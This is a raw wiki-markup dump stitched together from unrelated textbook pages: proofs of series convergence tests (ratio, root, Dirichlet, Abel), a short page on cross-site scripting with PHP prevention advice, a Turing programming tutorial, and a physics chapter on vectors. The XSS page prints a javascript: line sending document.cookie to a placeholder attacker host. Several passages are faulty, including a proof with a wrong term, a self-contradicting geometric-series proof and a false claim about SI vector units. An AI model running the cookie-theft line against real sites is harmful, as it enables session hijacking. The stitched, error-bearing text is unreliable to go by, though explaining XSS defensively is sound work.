Since &lt;math&gt;\textstyle\lim_{n \rightarrow \infty} \left|\frac{x_{n+1}}{x_n}\right| = r &lt;/math&gt;, we can choose an ''N'' so that |&amp;thinsp;|''x''&lt;sub&gt;''n''+1&lt;/sub&gt;/''x''&lt;sub&gt;''n''&lt;/sub&gt;|&amp;nbsp;&amp;minus;&amp;nbsp;r|&amp;nbsp;&lt;&amp;nbsp;ε/2 for all ''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N''.  In particular, if ''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N'', then  |''x''&lt;sub&gt;''n''+1&lt;/sub&gt;|/|''x''&lt;sub&gt;''n'&lt;/sub&gt;|&amp;nbsp;&lt;&amp;nbsp;''r''&amp;nbsp;+&amp;nbsp;ε/2.  Notice that our particular choice of ε guarantees that the ratio ''r''&amp;nbsp;+&amp;nbsp;ε/2 is less than 1.
  
Thus 
:&lt;math&gt; \sum_{n=1}^{\infty} |x_n| &lt;/math&gt; = &lt;math&gt; \sum_{n=1}^{N} |x_n| +  \sum_{n=N+1}^{\infty} |x_n|&lt;/math&gt;

:&lt;math&gt; = \sum_{n=1}^N |x_n| +  \sum_{n=N+1}^{\infty} |x_N|\frac{|x_{N+1}|}{|x_N|}\frac{|x_{N+2}|}{|x_{N+1}|}\cdots\frac{|x_{n}|}{|x_{n-1}|}&lt;/math&gt;

:&lt;math&gt;\leq \sum_{n=1}^N |x_n| +  |x_N|\sum_{n=N+1}^{\infty}(r + \frac{\epsilon}{2})^{n-N}.&lt;/math&gt; 

The last series converges because it is a geometric series whose ratio,  ''r''&amp;nbsp;+&amp;nbsp;ε/2&amp;nbsp;, is less than 1.  

By the comparison test, &lt;math&gt;\textstyle\sum_{n=1}^{\infty} |x_n| &lt;/math&gt; converges.  
Thus &lt;math&gt;\textstyle\sum_{n=1}^{\infty} x_n &lt;/math&gt; converges absolutely.  &lt;math&gt;\Box&lt;/math&gt;


The next theorem, the root test, is stronger than the ratio test in the sense that it works whenever the ratio test works (and returns the same number r), and it sometimes works even when the ratio test does not.

===Theorem (Root Test)===

Let &lt;math&gt;R = \limsup_{n\rightarrow\infty}(|a_n|^{\frac{1}{n}})&lt;/math&gt;.  If R &lt; 1, then the series &lt;math&gt;\sum_{n=1}^{\infty}a_n&lt;/math&gt; converges absolutely.  If R &gt; 1, then it diverges.

====Proof====

If R&lt;1, let &lt;math&gt;R&lt;\rho&lt;1&lt;/math&gt;.  Since &lt;math&gt;\limsup_{n\rightarrow\infty}(|a_n|^{\frac{1}{n}}) = R&lt;/math&gt;  &lt;math&gt;\exists N: \forall n \geq N:  |\sup\{|a_k|^{\frac{1}{k}}|k &gt; n\} - R| &lt; \rho - R&lt;/math&gt;.  

That is, &lt;math&gt;\forall n \geq N: \sup\{|a_k|^{\frac{1}{k}}|k &gt; n\} &lt; \rho&lt;/math&gt;

Thus &lt;math&gt;\sum_{n=1}^{\infty}|a_n| &lt;/math&gt;&lt;math&gt;= \sum_{n=1}^{\infty}(|a_n|^{\frac{1}{n}})^n &lt;/math&gt;&lt;math&gt;= \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(|a_n|^{\frac{1}{n}})^n &lt;/math&gt;&lt;math&gt; &lt; \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(\sup\{|a_k|^{\frac{1}{k}}|k &gt; n \})^n &lt;/math&gt;&lt;math&gt;&lt; \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(\rho)^n&lt;/math&gt;, which converges since it is a constant plus a geometric series.

By the comparison test, &lt;math&gt;\sum_{n=1}^{\infty}|a_n| &lt;/math&gt; converges as well. Thus &lt;math&gt;\sum_{n=1}^{\infty}a_n &lt;/math&gt; converges absolutely. 


If R &gt; 1, then &lt;math&gt;\sup\{|a_n|^{\frac{1}{n}} | k&gt;n\} &gt; 1&lt;/math&gt;.  Thus there are infinitely many n such that &lt;math&gt;|a_n|^{\frac{1}{n}} &gt; 1 \implies |a_n| &gt; 1 &lt;/math&gt;.  

Thus &lt;math&gt; (a_n) \not\rightarrow 0&lt;/math&gt;, which implies that &lt;math&gt;\sum_{n=1}^{\infty}a_n&lt;/math&gt; diverges. &lt;math&gt;\Box&lt;/math&gt;


We'll often be asked to consider series of the form &lt;math&gt;\sum_{n=1}^{\infty} a_nb_n &lt;/math&gt;.  The following theorems give criteria for convergence of these series.

===Theorem (Dirichlet's Test)===

If the partial sums &lt;math&gt;\sum_{n=1}^{N}x_n&lt;/math&gt; are bounded, and &lt;math&gt;(y_n)&lt;/math&gt; is a decreasing sequence with &lt;math&gt;\lim_{n\rightarrow\infty} y_n = 0&lt;/math&gt;, then &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges. [Note: &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; need not converge]

====Proof====

Let &lt;math&gt;s_n = \sum_{m=1}^n x_m&lt;/math&gt; be the &lt;math&gt;n&lt;/math&gt;th partial sum, so that there exists &lt;math&gt;B&gt;0&lt;/math&gt; such that &lt;math&gt;|s_n| \le B&lt;/math&gt;.

We can write

&lt;math&gt;\sum_{n=1}^N x_ny_n = x_1y_1 + \sum_{n=2}^N (s_n-s_{n-1})y_n = x_1y_1 + \sum_{n=2}^N s_ny_n - \sum_{n=2}^N s_{n-1}y_n&lt;/math&gt;.

Changing the index of summation in the last sum, this becomes

&lt;math&gt;\sum_{n=1}^N x_ny_n = x_1y_1 + \sum_{n=2}^N s_ny_n - \sum_{n=1}^{N-1} s_ny_{n+1} = x_1y_1 - x_1y_2
 + \sum_{n=2}^{N-1} s_n(y_n-y_{n+1}) + s_Ny_N&lt;/math&gt;.

The sum on the right-hand side is bounded absolutely by the telescoping sum

&lt;math&gt;\sum_{n=2}^{N-1} |s_n(y_n-y_{n+1})| \le B \sum_{n=2}^{N-1} (y_n-y_{n+1}) = B(y_2-y_N) \le By_2&lt;/math&gt;;

here we have used the fact that &lt;math&gt;(y_n)&lt;/math&gt; is positive and decreasing. It follows that

&lt;math&gt;\sum_{n=2}^\infty s_n(y_n-y_{n+1})&lt;/math&gt; is absolutely convergent, hence convergent.

Notice that &lt;math&gt;\lim_{N\to\infty} s_Ny_N = 0&lt;/math&gt; since &lt;math&gt;s_N&lt;/math&gt; is bounded and &lt;math&gt;(y_n)&lt;/math&gt; tends to 0 as &lt;math&gt;n&lt;/math&gt; tends to infinity. Therefore we can take limits as &lt;math&gt;N&lt;/math&gt; goes to infinity:

&lt;math&gt;\sum_{n=1}^\infty x_ny_n = x_1y_1 - x_1y_2 + \sum_{n=2}^\infty s_n(y_n-y_{n+1}) + \lim_{N\to\infty} s_Ny_N = x_1y_1 - x_1y_2 + \sum_{n=2}^\infty s_n(y_n-y_{n+1})&lt;/math&gt;,

which proves that the left-hand side is convergent.

Abel's Test can be regarded as a special case of Dirichlet's Test, once some modifications have been made:

===Theorem (Abel's Test)===

If &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; converges and &lt;math&gt;(y_n)&lt;/math&gt; is a positive, decreasing sequence, then &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges.

====Proof====

Because &lt;math&gt;(y_n)&lt;/math&gt; is a bounded, monotone sequence, it converges to some limit y.

Let &lt;math&gt;z_n = y_n - y&lt;/math&gt;.  Then &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; and &lt;math&gt;(z_n)&lt;/math&gt; satisfy the conditions for Dirichlet's test.

&lt;math&gt;\sum_{n=1}^{k}x_ny_n&lt;/math&gt;&lt;math&gt; = y\sum_{n=1}^{k}x_n + \sum_{n=1}^{k}x_nz_n&lt;/math&gt;.  By Dirichlet's test, &lt;math&gt;\sum_{n=1}^{k}x_nz_n&lt;/math&gt; converges as &lt;math&gt;k \rightarrow \infty&lt;/math&gt;.

Since both sums on the right converge, &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges as well. &lt;math&gt;\Box&lt;/math&gt;

==Examples with Proof==

Now we'll do the computations promised in the Examples, plus a few extra.

===Theorem (Geometric Series)===

If &lt;math&gt;|r|&lt;1&lt;/math&gt;, the geometric series &lt;math&gt; \sum_{n=1}^{\infty} a r^n = \frac{a}{1-r}&lt;/math&gt;.  If &lt;math&gt;|r| \geq 1&lt;/math&gt;, the series diverges.

====Proof====
In this case, it is best to explicitly compute the partial sums and take the limit.  Without loss of  generality, we'll consider the case &lt;math&gt;a = 1&lt;/math&gt;. Then we can apply the theorem on algebraic operations to obtain the general result.

Note that &lt;math&gt;s_n(1-r) = (1 + r + r^2 + ... + r^n)(1-r) = (1 + r + r^2 + ... + r^n) - (r + r^2 + ... + r^{n+1}) = 1 - r^{n+1}&lt;/math&gt;

Thus &lt;math&gt; s_n = \frac{1-r^n}{1-r} &lt;/math&gt;. Taking the limit (and remembering some basic facts about sequences):

If &lt;math&gt;|r| &lt; 1&lt;/math&gt;, &lt;math&gt;\sum_{n=1}^{\infty} r^n = \lim_{n \rightarrow \infty} s_n =  \lim_{n \rightarrow \infty} \frac{1-r^n}{1-r} = \frac{1}{1-r}&lt;/math&gt;.  

If &lt;math&gt;|r| \geq 1&lt;/math&gt;, the sequence of partial sums diverges to infinity, and thus by definition the series diverges. 

This proof seems to work except for the fact that this series will converge to &lt;math&gt;\frac{a} {1-r}&lt;/math&gt;
&lt;math&gt;\Box&lt;/math&gt;

===Theorem (p-series)===

The p-series &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; converges for &lt;math&gt;p&gt;1&lt;/math&gt; and diverges for &lt;math&gt;0&lt;p\le 1&lt;/math&gt;. [Note: We have technically only defined this series for p rational.  However, the theorem is still valid when p is irrational, for the same reasons]

====Proof====

First we'll consider the special cases &lt;math&gt;p = 1, p = 2&lt;/math&gt;, and then obtain the general result from these.

*If p = 1, let &lt;math&gt;x_n&lt;/math&gt; be the greatest power of 2 less than &lt;math&gt;\frac{1}{n}&lt;/math&gt;.  That is, &lt;math&gt;(x_n) = (\frac{1}{2}, \frac{1}{4},\frac{1}{4}, \frac{1}{8}, \frac{1}{8},\frac{1}{8},\frac{1}{8},\dots)&lt;/math&gt;.  

Grouping like terms together, &lt;math&gt;\sum_{i=1}^{\infty} x_n&lt;/math&gt;&lt;math&gt; = \sum_{i=0}^{\infty}(\sum_{j=2^i}^{2^{i+1}-1}x_j) &lt;/math&gt;&lt;math&gt; = \sum_{i=0}^{\infty}(\sum_{j=2^i}^{2^{i+1}-1} \frac{1}{2^{i+1}}) &lt;/math&gt;&lt;math&gt;= \sum_{i=1}^{\infty} \frac{1}{2}&lt;/math&gt;, which diverges.  

By definition, &lt;math&gt;x_n &lt; \frac{1}{n}&lt;/math&gt;, so by the comparison test &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n}&lt;/math&gt; diverges.


*If p = 2, let &lt;math&gt;x_n = \frac{1}{n(n-1)} = \frac{1}{n-1} - \frac{1}{n}&lt;/math&gt; if n&gt;1 and 1 if n=1.  

Using the theorem on telescoping series, &lt;math&gt;\sum_{n=1}^{\infty} x_n&lt;/math&gt;&lt;math&gt; = 1 + \sum_{n=2}^{\infty}(\frac{1}{n-1} - \frac{1}{n})&lt;/math&gt;&lt;math&gt; = 1 + 1 - \lim_{n\rightarrow\infty}(1/n) = 2&lt;/math&gt;

By definition, &lt;math&gt;x_n &gt; \frac{1}{n \cdot n} = \frac{1}{n^2}&lt;/math&gt;, so by the comparison test &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^2}&lt;/math&gt; converges as well.


*If 0 &lt; p &lt; 1, then &lt;math&gt;\frac{1}{n^p} &gt; \frac{1}{n}&lt;/math&gt;.  By the comparison test &lt;math&gt;\sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; diverges.

===Theorem (Decimal Expansions)===
Given any real number x, &lt;math&gt;0&lt;x&lt;1&lt;/math&gt; there is a unique sequence &lt;math&gt;(x_n): \sum_{n=0}^{\infty} \frac{x_n}{10^n} = x&lt;/math&gt;, &lt;math&gt;0 \leq x_n&lt;10&lt;/math&gt; and &lt;math&gt;\forall N: \exists n \geq N: x_n \not= 9&lt;/math&gt; 

====Proof====
Inductively, assume that there exist &lt;math&gt;x_0, x_1, \dots, x_k&lt;/math&gt; such that 
&lt;math&gt;\sum_{n=0}^{k} \frac{x_n}{10^n} \leq x &lt; 
\sum_{n=0}^{k} \frac{x_n}{10^n} + \frac{1}{10^k}&lt;/math&gt;.  

Rearranging, we see that &lt;math&gt;0 \leq x - \sum_{n=0}^{k} \frac{x_n}{10^n} &lt; \frac{1}{10^k}&lt;/math&gt;, or &lt;math&gt;0 \leq (x - \sum_{n=0}^{k} \frac{x_n}{10^n})10^{k+1} &lt; 10&lt;/math&gt;.

Let &lt;math&gt;x_{k+1}&lt;/math&gt; by the greatest integer such that &lt;math&gt;x_{k+1} \leq (x - \sum_{n=0}^{k} \frac{x_n}{10^n})10^{k+1}&lt;/math&gt;.  

Then &lt;math&gt;\frac{x_{k+1}}{10^{k+1}} \leq x - \sum_{n=0}^{k} \frac{x_n}{10^n} &lt; \frac{x_{k+1}+1}{10^{k+1}}&lt;/math&gt;(otherwise, &lt;math&gt;x_{k+1}&lt;/math&gt; would not be the greatest). 

Adding &lt;math&gt;\sum_{n=0}^{k} \frac{x_n}{10^n}&lt;/math&gt;, we see that &lt;math&gt;\sum_{n=0}^{k+1} \frac{x_n}{10^n} \leq x &lt; 
\sum_{n=0}^{k+1} \frac{x_n}{10^n} + \frac{1}{10^{k+1}}&lt;/math&gt;.  

Given &lt;math&gt;\epsilon&gt;0&lt;/math&gt; pick N such that &lt;math&gt;\epsilon &gt; \frac{1}{10^N} &lt;/math&gt;.

Thus &lt;math&gt;|\sum_{n=0}^{k} \frac{x_n}{10^n} -1| &lt; \frac{1}{10^k} &lt; \epsilon&lt;/math&gt; for all &lt;math&gt;k &gt; N&lt;/math&gt;.  That is, &lt;math&gt;x = \sum_{n=0}^{\infty} \frac{x_n}{10^n} &lt;/math&gt;.

==Rearrangement of terms==

===Definition===
By a rearrangement of terms, we mean a bijection f from the natural numbers to itself. Then a rearrangement of a series &lt;math&gt;\sum_{i=0}^\infty a_n&lt;/math&gt; is any series &lt;math&gt;\sum_{i=0}^\infty a_f(n)&lt;/math&gt; where f is any rearrangement.

===Theorem===
If a series is absolutely convergent, then all rearrangements of terms converge to the same limit.

====Proof====

===Theorem===
If a series &lt;math&gt;\{a_n\}&lt;/math&gt; is conditionally convergent but not absolutely convergent, then there exists a rearrangement for any a&lt;b such that lim inf &lt;math&gt;\sum \limits_{i=0}^n a_n=a&lt;/math&gt; and such that lim sup &lt;math&gt;\sum\limits_{i=0}^n a_n=b&lt;/math&gt;

== Problem ==
Cross site scripting (or XSS) is a basic description of a script sending sensitive information (such as cookies or other session identifiers) to other websites.

Usually, these attacks affect websites that content can be edited or added to.
In most cases, session identifiers or even usernames/passwords are stored inside cookies. In the case somebody knows the session identifier, they can easily use it on their machine to do any malicious tasks that you would not be happy about.

Right now, if you are logged in on wikibooks or any other websites, go to that page and type this into the address bar:
 javascript:void(alert(document.cookie))
These are cookies that are sent to the website each time to identify you. Easily, if your site is not XSS proof - the cracker will write anything like this:
 &lt;nowiki&gt;javascript:void(document.location('http://killer.website.com/steal_cookie.php?cookie_data='+document.cookie))&lt;/nowiki&gt;
that will send the cookie information to their website.

== Prevention ==
There are no chances to protect yourself from XSS attacks without removing malicious HTML/JavaScript code that would be submitted to another website.

As far, the most common way is to use [http://php.net/htmlentities htmlentities] or [http://php.net/htmlspecialchars htmlspecialchars] to filter the coding so nobody would add any HTML to your site (e.g. blog comments):
 $message = htmlentities($message);
Another way to do this is to overall create any kind of &quot;protected mode&quot; code, such as MediaWiki, BBCode or others that have been invented for purpose of easily styling/formatting user's content.

Another way is to replace colons in &quot;script:&quot; with &amp;amp;#58;, as well as disabling &quot;&lt;script&quot;.

      <text xml:space="preserve">'''This is a very simple program.  It will print text to the screen''', and then exit.

&lt;pre&gt;
put &quot;Hello, world!&quot;
&lt;/pre&gt;

Pretty simple, eh? As you probably deduced, &lt;code&gt;put&lt;/code&gt; prints text.  For now, we'll be using it to output to the screen.

Next, we'll learn how to gather input from the user using &lt;code&gt;get&lt;/code&gt;.  We'll also declare two variables, name and age.  The program will get the user's name and age, and repeat it back to them.

&lt;pre&gt;
var name : string %A string is text
var age : nat %Natural number

put &quot;What is your name?&quot;
get name
put &quot;&quot;
put &quot;How old are you?&quot;
get age

put &quot;Hello, &quot;, name, &quot; you are &quot;, age, &quot; years old!&quot;
&lt;/pre&gt;

First, we have to declare two variables.  Turing lets you declare variables anywhere in the program, but it's usually a good idea to declare them at the top. 

Now why was age a natural number? Why not an integer? Well, in Turing, natural numbers are all positive integers, including zero (0,1,2,3...). Integers, however, include negative numbers as well as positive numbers. The user's age shouldn't be a negative number, so it doesn't need to be an integer.

Second, did you notice the &lt;code&gt;%&lt;/code&gt; followed by some text? Those are called comments. They start at the percent-sign and continue until the end of the line. They are meant to be messages to you, the programmer, about your program. Turing doesn't care about them. They have no meaning except to the person reading the code, of which they may well be of great importance. It is important that you use meaningful comments. When you come back eight weeks later, or someone else reads your code, you may have no idea what that code you wrote meant.

After we have two variables set up, we proceed to ask the user their name...they have to know what to enter!

Then we say &lt;code&gt;get name&lt;/code&gt;.  This means, &quot;Let the user type in a string, and store it under the variable &lt;code&gt;name&lt;/code&gt; for later use.  Same for age.

Finally, we regurgitate the information back to the user.  Make sure you put spaces before closing the quotation marks, or else there won't be any spaces before and after their name and age!

One last thing: Turing uses token-oriented input.  This means that when the user inputs a space, it is treated the same as a line break.  But we don't want this in our program, because what if the user enters their first and last name? Therefore, we tell turing &quot;only get the next variable when they press enter.&quot;

To do this, replace &lt;code&gt;get name&lt;/code&gt; with &lt;code&gt;get name : *&lt;/code&gt;

      <text xml:space="preserve">==Introduction==

The study of physics is intimately tied in with the study of mathematics. Sometimes, the direction of a number or quantity is as important as the number itself.   Mathematicians in the 19th century developed a convenient way of describing and interacting with quantities with and without direction by dividing them into two types:  scalar quantities and vector quantities.  Scalar quantities have a magnitude but no direction. Vector quantities have both a magnitude and a direction. For instance, one might describe a plane as flying at 400 miles per hour. However, simply knowing the speed of the airplane is not nearly as useful as knowing the speed and direction of the airplane, so a more accurate description may be a plane flying at 400 miles per hour southeast.

==Scalar Quantities==
'''Scalar quantities''' are numbers that have a magnitude but no direction. Scalars are represented by a single letter, such as &lt;math&gt; a &lt;/math&gt;.  Some examples of scalar quantities are mass (''five kilograms''), temperature (''twenty-two degrees Celsius''), and numbers without units (such as ''three'').

==Vector Quantities==
'''Vectors''' are a geometric way of representing quantities that have direction as well as magnitude.  An example of a vector is force. If we are to fully describe a force on an object we need to specify not only how much force is applied, but also in which direction.  Another example of a vector quantity is velocity -- an object that is traveling at ten meters per second to the east has a different velocity than an object that is traveling ten meters per second to the west.  This vector is a special case, however,sometimes people are interested in only the magnitude of the velocity of an object.  This quantity, a scalar, is called speed which has magnitude but no given direction.  

When vectors are written, they are represented by a single letter in bold type or with an arrow above the letter, such as &lt;math&gt; \mathbf{A} &lt;/math&gt; or &lt;math&gt; \vec A &lt;/math&gt;.  Some examples of vectors are displacement (e.g. ''120 cm at 30°'') and velocity (e.g. ''12 meters per second north'').
The only basic SI unit that is a vector is the meter.  All others are scalars.  Derived quantities can be vector or scalar, but every vector quantity must involve meters in its definition and unit.

==Unit Vectors==
[[Image:Unit-vectors-in-Cartesian-Coord.png|right|thumbnail|An illustration of common choice of unit vectors in a Cartesian coordinate system]]

Strictly speaking, vectors exist separately from any coordinate systems. As vectors are geometric objects, we do not need to define a coordinate system in order to talk about vectors&amp;mdash;or even to perform most operations on vectors.  For example, consider the triple of numbers: number of apples, number of bananas, and number of carrots you have.  Say that you calculate the triple in one coordinate system and get (1,2,3).  If you rotate your coordinate system, and recalculate, you will have (1,2,3) again.  Thus, the triple does not have the most important property of a vector -- that is transform like the coordinate system.

Nevertheless, it is often convenient to introduce a coordinate system. In three dimensions, for many problems the rectangular, or Cartesian coordinate system (named after French mathematician Ren&amp;eacute; Descartes) turns out to be convenient, and this coordinate system can be defined in terms of unit vectors.

A '''unit vector''' is a vector pointing in a given direction with a magnitude of one.  Essentially, it merely indicates direction.  In a Cartesian system the three unit vectors are called &lt;b&gt;i&lt;/b&gt;, &lt;b&gt;j&lt;/b&gt;, and &lt;b&gt;k&lt;/b&gt; (or, in handwriting, with a little &quot;hat&quot; on top, as &lt;math&gt;\hat{i}&lt;/math&gt;, &lt;math&gt;\hat{j}&lt;/math&gt;, and &lt;math&gt;\hat{k}&lt;/math&gt;).  Colloquially, you might refer to the directions of the unit vectors as &quot;east&quot;, &quot;north&quot;, and &quot;up&quot;.  One could just have easily chosen &lt;b&gt;i&lt;/b&gt; as up, &lt;b&gt;j&lt;/b&gt; as east, and &lt;b&gt;k&lt;/b&gt; as north.  In choosing &lt;b&gt;i&lt;/b&gt;, &lt;b&gt;j&lt;/b&gt;, and &lt;b&gt;k&lt;/b&gt;, once &lt;b&gt;i&lt;/b&gt; and &lt;b&gt;j&lt;/b&gt; are chosen, &lt;b&gt;k&lt;/b&gt; must point to a particular direction, so that a common convention called &quot;right-hand rule&quot; holds. Mathematically, this can be compactly expressed as,

&lt;center&gt;&lt;math&gt;\hat{k} = \hat{i} \times \hat{j}&lt;/math&gt;,&lt;/center&gt;

but we will expand more on this as we describe &quot;cross products&quot; later on.

Unit vectors are generally chosen to be orthogonal.  That is, each unit vector is perpendicular to each of the others. While unit vectors do not need to be orthogonal, working with a coordinate system defined by orthogonal unit vectors will be convenient in most cases. There are two other major coordinate systems used in physics&amp;mdash;cylindrical coordinates and spherical coordinates.  These will be introduced at a later time as necessary.

==Vector Components==
Every vector may be expressed as the sum of its &lt;i&gt;n&lt;/i&gt; unit vectors.

&lt;center&gt;&lt;math&gt;\vec{A} = a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

The quantities &lt;i&gt;a&lt;sub&gt;x&lt;/sub&gt;&lt;/i&gt;, &lt;i&gt;a&lt;sub&gt;y&lt;/sub&gt;&lt;/i&gt;, and &lt;i&gt;a&lt;sub&gt;z&lt;/sub&gt;&lt;/i&gt; are called the vector components of vector &lt;b&gt;A&lt;/b&gt;. Sometimes they are represented simply as an ordered triple (e.g. (&lt;i&gt;a&lt;sub&gt;x&lt;/sub&gt;&lt;/i&gt;,&lt;i&gt;a&lt;sub&gt;y&lt;/sub&gt;&lt;/i&gt;,&lt;i&gt;a&lt;sub&gt;z&lt;/sub&gt;&lt;/i&gt;)) especially when the choice and ordering of three unit vectors are not ambiguous.

==Vector Algebra==
===Negation===
[[Image:Vector-negation-and-scalar-multiplication.png|right|thumbnail|Illustration of vector negation and scalar multiplication]]
&lt;center&gt;&lt;math&gt;-\vec{A} = -(a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}) = -a_x~\hat{i} - a_y~\hat{j} - a_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

Considering a vector represented graphically by an arrow, the negative of a vector would be represented by a vector of the same length but opposite direction.

===Scalar Multiplication===
&lt;center&gt;&lt;math&gt;k\vec{A} = ka_x~\hat{i} + ka_y~\hat{j} + ka_z~\hat{k}&lt;/math&gt;&lt;/center&gt;

Note that vector negation is merely multiplication by a scalar, where that scalar is -1.  A scaled vector represented graphically would point in the same direction as the original vector but have its magnitude scaled by a factor of &lt;i&gt;k&lt;/i&gt;.

===Addition===
[[Image:Head-to-tail_Addition.png|right|thumbnail|Illustration of head-to-tail addition]]

&lt;center&gt;&lt;math&gt;\begin{align}\vec{A} + \vec{B} &amp;= (a_x~\hat{i} + a_y~\hat{j} + a_z~\hat{k}) + (b_x~\hat{i} + b_y~\hat{j} + b_z~\hat{k}) \\ &amp;= (a_x + b_x)~\hat{i} + (a_y + b_y)~\hat{j} + (a_z + b_z)~\hat{k}\end{align}&lt;/math&gt;&lt;/center&gt;

Two vectors can be added graphically by placing the tail of the second vector (here, &lt;b&gt;B&lt;/b&gt;) coincidental with the tip of the first vector (&lt;b&gt;A&lt;/b&gt;).  The resultant vector &lt;b&gt;A&lt;/b&gt; + &lt;b&gt;B&lt;/b&gt; is the vector drawn from the tail of &lt;b&gt;A&lt;/b&gt; to the tip of &lt;b&gt;B&lt;/b&gt;.

Any number of vectors can be added in this fashion.  Vector addition is commutative:

&lt;center&gt;&lt;math&gt;\vec{A} + \vec{B} + \vec{C} = \vec{C} + \vec{B} + \vec{A}&lt;/math&gt;&lt;/center&gt;

and associative:

&lt;center&gt;&lt;math&gt;(\vec{A} + \vec{B}) + \vec{C} = \vec{A} + (\vec{B} + \vec{C})&lt;/math&gt;&lt;/center&gt;

===Dot Product===
When we multiply two vectors, we can either apply a multiplication rule that produces a scalar as the end result, or one that produces a vector as the end result. The first one that produces a scalar is called '''dot product'''. In mathematical texts, this is often called ''inner product'', and some older texts will refer to this as ''scalar product'' (not to be confused with scalar multiplication); they are all the same. Dot product has all the usual properties of products, such as associativity, commutativity, and the distributive property. Geometrically, dot product is defined as:

&lt;center&gt;&lt;math&gt;\vec{A}\cdot \vec{B} = A B \cos(\theta)&lt;/math&gt;,&lt;/center&gt;

where &lt;math&gt;\theta&lt;/math&gt; is the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt;. Note that since &lt;math&gt;\cos(0) = 1&lt;/math&gt;, if &lt;math&gt;\vec{A}&lt;/math&gt; is parallel to &lt;math&gt;\vec{B}&lt;/math&gt;, then &lt;math&gt;\vec{A} \cdot \vec{B} = AB&lt;/math&gt;. On the other hand, since &lt;math&gt;\cos(90^\circ) = 0&lt;/math&gt; if &lt;math&gt;\vec{A}&lt;/math&gt; is perpendicular to &lt;math&gt;\vec{B}&lt;/math&gt;, then &lt;math&gt;\vec{A} \cdot \vec{B} = 0&lt;/math&gt;. Using this as the guiding rule, we find below relationship:

&lt;center&gt;&lt;math&gt;\begin{align} \hat{i} \cdot \hat{i} = \hat{j} \cdot \hat{j} = \hat{k} \cdot \hat{k} = 1 \\ \hat{i} \cdot \hat{j} = \hat{j} \cdot \hat{k} = \hat{k} \cdot \hat{i} = 0\end{align}&lt;/math&gt;.&lt;/center&gt;

Using this, we can define dot product in terms of component vectors as follows:

&lt;center&gt;&lt;math&gt;\vec{A}\cdot\vec{B} = (A_x~\hat{i} + A_y~\hat{j} + A_z~\hat{k})\cdot(B_x~\hat{i} + B_y~\hat{j} + B_z~\hat{k}) = A_x B_x + A_y B_y + A_z B_z&lt;/math&gt;.&lt;/center&gt;

You are encouraged to expand out the multiplication explicitly, using the distributive property and find which terms cancel to zero and which products become 1.

=== Cross Product ===

The second multiplication rule for product of two vectors yields yet another vector. This multiplication rule is a very special one&amp;mdash;in fact, it is a special property of 3-dimensional space that we can define a vector multiplication is this way and still obtain a vector. This rule will not work when limited to 2-D, and in any dimensions greater than 3, an extension of this rule will not result in another vector (cf. dot product can be naturally extended or limited to any dimensions to produce a scalar). This multiplication is called '''cross product''', and in other texts, you may find terms ''outer product'' and ''vector product''. The product can be defined with the two rules, first specifying the product vector's direction, and the second specifying its magnitude:
# &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt; is perpendicular to &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt; (that is, perpendicular to the plane defined by these two vectors). This leaves two possible directions along the line perpendicular to the plane. One of the two directions is called by a &quot;right-hand rule&quot;: Hold out index finger, middle finger, and the thumb so that they are all perpendicular to each other. Let the index finger point towards direction of &lt;math&gt;\vec{A}&lt;/math&gt;, and the middle finger towards &lt;math&gt;\vec{B}&lt;/math&gt;. Then the thumb points towards the direction of &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt;. The ordering is important here (note exchanging A and B makes the thumb point in the opposite direction).
# &lt;math&gt;|\vec{A} \times \vec{B} | = A B \sin(\theta)&lt;/math&gt;, where &lt;math&gt;\theta&lt;/math&gt; is again the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt;.

Applying this definition to unit vectors again, we find following relationships:
&lt;center&gt;&lt;math&gt;\begin{align} \hat{i} \times \hat{j} &amp;= - \hat{j} \times \hat{i} = \hat{k} \\ \hat{j} \times \hat{k} &amp;= - \hat{k} \times \hat{j} = \hat{i} \\ \hat{k} \times \hat{i} &amp;= - \hat{i} \times \hat{k} = \hat{j} \\ \hat{i} \times \hat{i} &amp;= \hat{j} \times \hat{j} = \hat{k} \times \hat{k} = 0 \end{align}&lt;/math&gt;.&lt;/center&gt;
And in terms of components, we have (after a tedious algebra):
&lt;center&gt;&lt;math&gt;\vec{A} \times \vec{B} = (A_y B_z - B_y A_z)~\hat{i} + (A_z B_x - B_z A_x)~\hat{j} + (A_x B_y - B_x A_y)~\hat{k}&lt;/math&gt;.&lt;/center&gt;

It turns out we can write this complicated relationship as a [http://en.wikipedia.org/wiki/Determinant determinant] of a 3 x 3 matrix:
&lt;center&gt;&lt;math&gt;\vec{A} \times \vec{B} = \left| \begin{matrix} \hat{i} &amp; \hat{j} &amp; \hat{k} \\ A_x &amp; A_y &amp; A_z \\ B_x &amp; B_y &amp; B_z \end{matrix} \right|&lt;/math&gt;.&lt;/center&gt;
Some properties of cross product, such as &lt;math&gt;\vec{A} \times \vec{B} = - \vec{B} \times \vec{A}&lt;/math&gt; and &lt;math&gt;\vec{A} \times \vec{A} = 0&lt;/math&gt; can be derived as a property of the determinant of the matrix.

=== Useful Properties of Dot Product and Cross Product ===
Both the dot product and the cross product distribute over vector addition.

